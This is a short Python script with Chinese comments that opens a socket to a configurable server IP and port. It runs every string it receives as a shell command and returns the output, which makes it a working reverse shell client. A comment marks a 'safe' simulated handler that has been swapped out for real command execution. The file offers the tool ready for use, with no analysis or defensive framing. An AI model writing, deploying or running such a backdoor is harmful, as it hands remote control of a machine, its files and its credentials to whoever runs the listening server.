import socket, shlex
import subprocess


def _run_command(command: str) -> str:
    """执行 shell 命令并返回输出字符串。
    """
    try:
        proc = subprocess.run(
            command, shell=True, capture_output=True, text=True, timeout=15
        )
        output = proc.stdout.strip() or proc.stderr.strip()
        return output if output else "(no output)"
    except FileNotFoundError:
        return f"(command not found: {command})"
    except subprocess.TimeoutExpired:
        return "(command timed out)"
    except Exception as e:
        return f"(error: {e})"


HOST = "127.0.0.1"  # 改成服务器IP
PORT = 61006

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    data = s.recv(1024).decode()
    if not data:
        break

    # ⚠️ 这里只是模拟处理（安全版本）
    # response = f"[client received]: {data}"

    # ⚠️ 执行命令
    response = _run_command(data)

    s.send(response.encode())

s.close()